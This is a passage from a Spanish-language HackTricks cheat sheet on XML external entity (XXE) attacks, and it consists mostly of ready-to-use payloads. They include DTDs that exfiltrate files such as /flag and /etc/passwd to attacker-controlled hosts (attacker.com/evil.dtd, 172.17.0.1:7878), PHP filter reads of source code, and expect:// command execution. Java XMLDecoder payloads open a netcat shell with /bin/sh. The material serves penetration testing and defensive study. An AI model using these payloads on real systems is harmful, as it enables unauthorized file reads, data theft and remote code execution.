Si la web utiliza PHP, en lugar de usar `file:/` puedes utilizar **php wrappers** `php://filter/convert.base64-encode/resource=` para **acceder a archivos internos**.

Si la web utiliza Java, puedes revisar el [**protocolo jar:**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truco de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Puedes crear una **entidad dentro de otra entidad** codific√°ndola con **entidades HTML** y luego llamarla para **cargar un dtd**.\
Ten en cuenta que las **Entidades HTML** utilizadas deben ser **num√©ricas** (como \[en este ejemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Ejemplo de DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Envoltorios de PHP

### Base64

**Extraer** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extraer recurso externo**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Ejecuci√≥n de c√≥digo remoto

**Si el m√≥dulo "expect" de PHP est√° cargado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```markup
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Esta secci√≥n fue tomada de [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)\
Seg√∫n la [Wikipedia](https://en.wikipedia.org/wiki/XLIFF):

> XLIFF (XML Localization Interchange File Format) es un formato de bitexto basado en XML creado para estandarizar la forma en que los datos localizables se pasan entre herramientas y durante un proceso de localizaci√≥n y un formato com√∫n para el intercambio de herramientas CAT.

### Solicitud ciega
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
La respuesta del servidor con un error:
```javascript
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Pero obtuvimos un resultado en Burp Collaborator.

### Exfiltraci√≥n de Datos v√≠a Fuera de Banda
```markup
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Basado en el User Agent mostrado por burp collaborator, parece que est√° utilizando **Java 1.8**. Uno de los problemas al explotar XXE en esta versi√≥n de Java es que **no podemos obtener archivos que contienen un `New Line`** como `/etc/passwd` utilizando la t√©cnica Out of Band.

### Exfiltraci√≥n de Datos v√≠a Error Based

Archivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Respuesta del Servidor:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
¬°Genial! El archivo `non-exist` se refleja en los mensajes de error. Lo siguiente es a√±adir el contenido del archivo.

Archivo DTD:
```markup
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Y el contenido del archivo fue exitosamente **impreso en la salida del error enviado v√≠a HTTP**.

## RSS - XEE

XML v√°lido con formato RSS para explotar una vulnerabilidad XXE.

### Ping back

Solicitud HTTP simple al servidor del atacante
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer archivo
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Leer c√≥digo fuente

Usando el filtro base64 de PHP
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE a RCE

XMLDecoder es una clase de Java que crea objetos basados en un mensaje XML. Si un usuario malicioso puede hacer que una aplicaci√≥n utilice datos arbitrarios en una llamada al m√©todo **readObject**, obtendr√° instant√°neamente ejecuci√≥n de c√≥digo en el servidor.

### Usando Runtime().exec()
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Herramientas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## M√°s recursos

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
Extraer informaci√≥n v√≠a HTTP usando DTD externo propio: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
